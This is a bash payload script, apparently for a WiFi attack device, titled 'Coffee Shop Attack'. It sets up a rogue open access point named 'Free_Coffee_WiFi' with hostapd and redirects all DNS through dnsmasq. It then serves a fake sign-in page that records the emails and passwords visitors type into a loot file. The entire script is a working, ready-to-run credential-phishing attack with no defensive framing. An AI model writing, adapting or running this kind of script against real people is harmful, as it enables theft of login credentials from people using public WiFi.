#!/bin/bash
# Title: Coffee Shop Attack
# Author: bad-antics
# Description: Rogue AP for public WiFi credential capture
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/coffeeshop"
mkdir -p "$LOOT_DIR"
PORTAL_DIR="/tmp/cafe_portal"

PROMPT "COFFEE SHOP ATTACK

Creates a convincing open
WiFi network that captures
credentials via portal.

No aircrack needed - uses
hostapd and dnsmasq.

Press OK to configure."

# Need a non-monitor interface for AP mode
AP_IF="wlan1"
[ ! -d "/sys/class/net/$AP_IF" ] && AP_IF="wlan0"
[ ! -d "/sys/class/net/$AP_IF" ] && { ERROR_DIALOG "No WiFi interface found!"; exit 1; }

SSID=$(TEXT_PICKER "AP Name:" "Free_Coffee_WiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="Free_Coffee_WiFi" ;; esac

DURATION=$(NUMBER_PICKER "Duration (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
DURATION_SEC=$((DURATION * 60))

resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?

SSID: $SSID
Duration: ${DURATION} minutes
Interface: $AP_IF

Victims connecting will see
a credential capture portal.

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

CRED_LOG="$LOOT_DIR/cafe_$(date +%Y%m%d_%H%M).txt"
echo "Coffee Shop Credentials - $(date)" > "$CRED_LOG"

killall hostapd dnsmasq 2>/dev/null
sleep 1

# Create portal
mkdir -p "$PORTAL_DIR/cgi-bin"

cat > "$PORTAL_DIR/cgi-bin/capture" << CAPEOF
#!/bin/sh
echo "Content-type: text/html"
echo ""
if [ "\$REQUEST_METHOD" = "POST" ]; then
    read POST_DATA
else
    POST_DATA="\$QUERY_STRING"
fi
TS=\$(date "+%Y-%m-%d %H:%M:%S")
IP=\$REMOTE_ADDR
echo "[\$TS] IP:\$IP DATA:\$POST_DATA" >> $CRED_LOG
cat << HTML
<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="2;url=/success.html"></head>
<body style="font-family:Arial;text-align:center;padding:50px">
<h1 style="color:#4caf50">Connecting...</h1></body></html>
HTML
CAPEOF
chmod +x "$PORTAL_DIR/cgi-bin/capture"

cat > "$PORTAL_DIR/index.html" << PORTALEOF
<!DOCTYPE html>
<html><head><title>$SSID - Free WiFi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#f9f9f9;margin:0;padding:20px}.c{max-width:400px;margin:0 auto;background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,.1)}.l{text-align:center;font-size:40px;margin-bottom:20px}h1{text-align:center;color:#333;font-size:22px}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px}button{width:100%;padding:14px;background:#4caf50;color:#fff;border:none;border-radius:8px;font-size:16px}</style>
</head><body><div class="c"><div class="l">☕</div><h1>$SSID</h1>
<p style="text-align:center;color:#666">Sign in for free WiFi</p>
<form method="POST" action="/cgi-bin/capture">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password">
<button type="submit">Connect</button></form></div></body></html>
PORTALEOF

cat > "$PORTAL_DIR/success.html" << 'SEOF'
<!DOCTYPE html><html><head><title>Connected!</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f9f9f9}h1{color:#4caf50}</style>
</head><body><h1>✓ Connected!</h1><p>Enjoy free WiFi</p></body></html>
SEOF

LOG "Starting Coffee Shop AP..."

# Disable monitor mode on this interface if active
airmon-ng stop "${AP_IF}mon" 2>/dev/null

cat > /tmp/cafe_hostapd.conf << HEOF
interface=$AP_IF
ssid=$SSID
channel=6
hw_mode=g
auth_algs=1
wpa=0
HEOF

hostapd /tmp/cafe_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/cafe_dns.conf << DEOF
interface=$AP_IF
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.200,12h
address=/#/10.0.0.1
DEOF
dnsmasq -C /tmp/cafe_dns.conf 2>/dev/null

uhttpd -p 10.0.0.1:80 -h "$PORTAL_DIR" -c /cgi-bin -x /cgi-bin 2>/dev/null &

LOG "Coffee Shop active: $SSID"

sleep "$DURATION_SEC"

killall hostapd dnsmasq uhttpd 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/cafe_*.conf

CRED_COUNT=$(grep -c "DATA:" "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "COFFEE SHOP COMPLETE

SSID: $SSID
Duration: ${DURATION} min
Captured: $CRED_COUNT creds
Log: $CRED_LOG

Press OK to exit."
